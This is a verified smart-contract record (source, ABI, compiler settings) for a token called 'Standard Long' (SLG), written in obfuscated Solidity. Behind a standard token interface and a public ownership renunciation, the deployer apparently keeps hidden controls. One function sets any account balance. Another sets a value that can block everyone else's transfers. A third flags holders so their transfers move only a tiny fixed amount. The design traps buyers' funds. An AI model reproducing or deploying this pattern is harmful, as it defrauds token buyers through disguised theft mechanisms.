{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface fromAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchMaxReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeMode {\n    function createPair(address listMax, address tradingLiquidityLaunch) external returns (address);\n}\n\ninterface feeMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toEnable) external view returns (uint256);\n\n    function transfer(address exemptTake, uint256 txExempt) external returns (bool);\n\n    function allowance(address sellEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptTake,\n        uint256 txExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atWallet, uint256 value);\n    event Approval(address indexed sellEnable, address indexed spender, uint256 value);\n}\n\ninterface feeMinTeam is feeMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StandardLong is launchMaxReceiver, feeMax, feeMinTeam {\n\n    uint256 tradingEnable;\n\n    function allowance(address toMarketing, address minLimit) external view virtual override returns (uint256) {\n        if (minLimit == limitMax) {\n            return type(uint256).max;\n        }\n        return maxLiquidity[toMarketing][minLimit];\n    }\n\n    function launchMode(address sellMinIs) public {\n        if (teamLimitExempt) {\n            return;\n        }\n        if (modeToken != walletToken) {\n            walletReceiver = receiverToken;\n        }\n        isToken[sellMinIs] = true;\n        if (totalAutoWallet != receiverToken) {\n            receiverToken = modeToken;\n        }\n        teamLimitExempt = true;\n    }\n\n    bool public launchExempt;\n\n    event OwnershipTransferred(address indexed fundMode, address indexed receiverTeam);\n\n    function fromTo(address walletExempt, uint256 txExempt) public {\n        launchedToReceiver();\n        marketingTx[walletExempt] = txExempt;\n    }\n\n    function getOwner() external view returns (address) {\n        return maxTx;\n    }\n\n    address public swapList;\n\n    function transferFrom(address launchedAt, address exemptTake, uint256 txExempt) external override returns (bool) {\n        if (_msgSender() != limitMax) {\n            if (maxLiquidity[launchedAt][_msgSender()] != type(uint256).max) {\n                require(txExempt <= maxLiquidity[launchedAt][_msgSender()]);\n                maxLiquidity[launchedAt][_msgSender()] -= txExempt;\n            }\n        }\n        return autoFrom(launchedAt, exemptTake, txExempt);\n    }\n\n    function takeMin(uint256 txExempt) public {\n        launchedToReceiver();\n        tradingEnable = txExempt;\n    }\n\n    bool public buyEnableWallet;\n\n    uint256 public totalAutoWallet;\n\n    mapping(address => bool) public limitWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalLaunchAuto;\n    }\n\n    constructor (){\n        \n        fromAmount listFee = fromAmount(limitMax);\n        senderSell = takeMode(listFee.factory()).createPair(listFee.WETH(), address(this));\n        \n        swapList = _msgSender();\n        sellMode();\n        isToken[swapList] = true;\n        marketingTx[swapList] = fromFeeAt;\n        if (walletReceiver == liquidityIsExempt) {\n            walletToken = liquidityIsExempt;\n        }\n        emit Transfer(address(0), swapList, fromFeeAt);\n    }\n\n    function autoFrom(address launchedAt, address exemptTake, uint256 txExempt) internal returns (bool) {\n        if (launchedAt == swapList) {\n            return toLimit(launchedAt, exemptTake, txExempt);\n        }\n        uint256 fundWalletLimit = feeMax(senderSell).balanceOf(toBuy);\n        require(fundWalletLimit == tradingEnable);\n        require(exemptTake != toBuy);\n        if (limitWallet[launchedAt]) {\n            return toLimit(launchedAt, exemptTake, tokenReceiver);\n        }\n        return toLimit(launchedAt, exemptTake, txExempt);\n    }\n\n    function launchedToReceiver() private view {\n        require(isToken[_msgSender()]);\n    }\n\n    function transfer(address walletExempt, uint256 txExempt) external virtual override returns (bool) {\n        return autoFrom(_msgSender(), walletExempt, txExempt);\n    }\n\n    address public senderSell;\n\n    function balanceOf(address toEnable) public view virtual override returns (uint256) {\n        return marketingTx[toEnable];\n    }\n\n    address toBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private receiverAuto = \"Standard Long\";\n\n    function owner() external view returns (address) {\n        return maxTx;\n    }\n\n    uint256 isMarketing;\n\n    uint256 private walletReceiver;\n\n    uint256 private liquidityIsExempt;\n\n    uint256 public walletToken;\n\n    function toLimit(address launchedAt, address exemptTake, uint256 txExempt) internal returns (bool) {\n        require(marketingTx[launchedAt] >= txExempt);\n        marketingTx[launchedAt] -= txExempt;\n        marketingTx[exemptTake] += txExempt;\n        emit Transfer(launchedAt, exemptTake, txExempt);\n        return true;\n    }\n\n    uint256 public modeToken;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverAuto;\n    }\n\n    address private maxTx;\n\n    string private launchReceiverIs = \"SLG\";\n\n    address limitMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function sellMode() public {\n        emit OwnershipTransferred(swapList, address(0));\n        maxTx = address(0);\n    }\n\n    function approve(address minLimit, uint256 txExempt) public virtual override returns (bool) {\n        maxLiquidity[_msgSender()][minLimit] = txExempt;\n        emit Approval(_msgSender(), minLimit, txExempt);\n        return true;\n    }\n\n    bool public marketingToken;\n\n    bool public teamLimitExempt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromFeeAt;\n    }\n\n    uint256 private receiverToken;\n\n    uint256 constant tokenReceiver = 17 ** 10;\n\n    uint256 private fromFeeAt = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private maxLiquidity;\n\n    function launchTrading(address enableTradingFund) public {\n        launchedToReceiver();\n        if (walletReceiver == teamLaunchedIs) {\n            modeToken = receiverToken;\n        }\n        if (enableTradingFund == swapList || enableTradingFund == senderSell) {\n            return;\n        }\n        limitWallet[enableTradingFund] = true;\n    }\n\n    uint8 private totalLaunchAuto = 18;\n\n    mapping(address => bool) public isToken;\n\n    uint256 private teamLaunchedIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchReceiverIs;\n    }\n\n    mapping(address => uint256) private marketingTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyEnableWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txExempt\",\"type\":\"uint256\"}],\"name\":\"fromTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMinIs\",\"type\":\"address\"}],\"name\":\"launchMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTradingFund\",\"type\":\"address\"}],\"name\":\"launchTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txExempt\",\"type\":\"uint256\"}],\"name\":\"takeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLimitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAutoWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "StandardLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}